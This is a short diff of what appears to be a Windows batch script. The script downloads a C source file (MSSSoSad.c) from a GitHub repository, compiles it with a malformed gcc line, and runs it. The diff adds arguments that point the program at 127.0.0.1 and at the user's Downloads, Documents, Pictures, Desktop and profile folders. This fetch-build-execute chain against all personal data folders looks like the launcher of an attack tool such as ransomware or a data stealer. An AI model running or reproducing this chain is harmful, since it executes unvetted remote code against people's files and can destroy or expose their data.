@@ -13,7 +13,7 @@ curl -L https://github.com/kaosSec/kaosTools/raw/main/C/MSSSoSad.c -o MSSSoSad.c
 
 gcc -o MSSSoSad.c MSSSoSad.c
 
-.\MSSSoSad.c
+.\MSSSoSad.c 127.0.0.1 %Downloads% %User% %Pictures% %Documents% %Desktop%
 
 endlocal
 start https://github.com/kaosSec
